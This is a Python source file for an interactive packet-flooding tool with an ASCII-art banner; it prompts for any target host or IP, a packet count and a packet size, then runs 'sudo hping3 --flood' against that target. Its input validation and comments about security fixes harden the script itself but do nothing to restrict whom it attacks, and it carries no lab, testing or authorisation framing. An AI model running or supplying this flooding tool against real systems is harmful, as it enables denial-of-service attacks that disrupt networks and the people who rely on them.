import subprocess
import re

# =============================================================================
# INPUT VALIDATION HELPERS
# =============================================================================

def validate_ip_or_hostname(target):
    """
    Validate IP address or hostname format.
    Returns True if valid, False otherwise.
    """
    if not target or not isinstance(target, str):
        return False
    
    # Remove dangerous shell characters
    dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '{', '}', '<', '>', '\n', '\r', '\\']
    for char in dangerous_chars:
        if char in target:
            return False
    
    # IPv4 address pattern
    ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    # Hostname pattern
    hostname_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9]$|^[a-zA-Z0-9]$'
    
    if re.match(ipv4_pattern, target) or re.match(hostname_pattern, target):
        return True
    return False


def validate_positive_integer(value, max_val=None):
    """
    Validate that input is a positive integer string.
    Returns True if valid, False otherwise.
    """
    if not value or not isinstance(value, str):
        return False
    if not value.isdigit() or int(value) <= 0:
        return False
    if max_val and int(value) > max_val:
        return False
    return True


# Function for flooding packets
def flood_pkt(target_ip, pktnum, pktsize):
    """
    Perform packet flooding attack using hping3.
    """
    # Validate inputs
    if not validate_ip_or_hostname(target_ip):
        print("\033[31mError: Invalid target IP/hostname format.\033[0m")
        return
    
    if not validate_positive_integer(pktnum):
        print("\033[31mError: Invalid packet number. Must be a positive integer.\033[0m")
        return
    
    if not validate_positive_integer(pktsize, max_val=65535):
        print("\033[31mError: Invalid packet size. Must be between 1 and 65535.\033[0m")
        return

    # Start flooding with given parameters in the function
    try:
        print("\n\033[36m Begin Packet Flooding...")
        # Use argument list instead of shell=True for security
        res = subprocess.run(
            ['sudo', 'hping3', '-c', pktnum, '-d', pktsize, '--flood', target_ip],
            text=True
        )
    
    # Fixed typo: KeyboardInterrupt instead of KeyboadInterrupt
    except KeyboardInterrupt: 
        print("\n\033[31m Process stopped by the user before completion !!!")
    except FileNotFoundError:
        print("\033[31mError: hping3 not found. Please install hping3 package.\033[0m")
    except Exception as e:
        print(f"\033[31mError during packet flooding: {e}\033[0m")
    finally:
        print("\n\033[36m Exiting the program")


def collect():
    """
    Collect target information and parameters for packet flooding.
    """
    art = '''
 ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓███████▓▒░ ░▒▓█████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
                                                                                 

    '''
    print(f"\033[91m{art}\033[0m")
    
    # Get and validate target IP/hostname
    while True:
        target_ip = input("\033[36mEnter the target host or ip: ")
        if validate_ip_or_hostname(target_ip):
            break
        print("\033[31mInvalid target format. Please enter a valid IP or hostname.\033[0m")
    
    # Get and validate packet number
    while True:
        pkt_num = input("\n\033[36m Number of Packets to flood(>50000): ")
        if validate_positive_integer(pkt_num):
            break
        print("\033[31mInvalid packet number. Please enter a positive integer.\033[0m")
    
    # Get and validate packet size (fixed typo: was 033 instead of \033)
    while True:
        pkt_size = input("\n\033[36m Size of Packet(<1500):\033[0m ")
        if validate_positive_integer(pkt_size, max_val=65535):
            break
        print("\033[31mInvalid packet size. Please enter a value between 1 and 65535.\033[0m")
    
    flood_pkt(target_ip, pkt_num, pkt_size)

if __name__ == '__main__':
    collect()
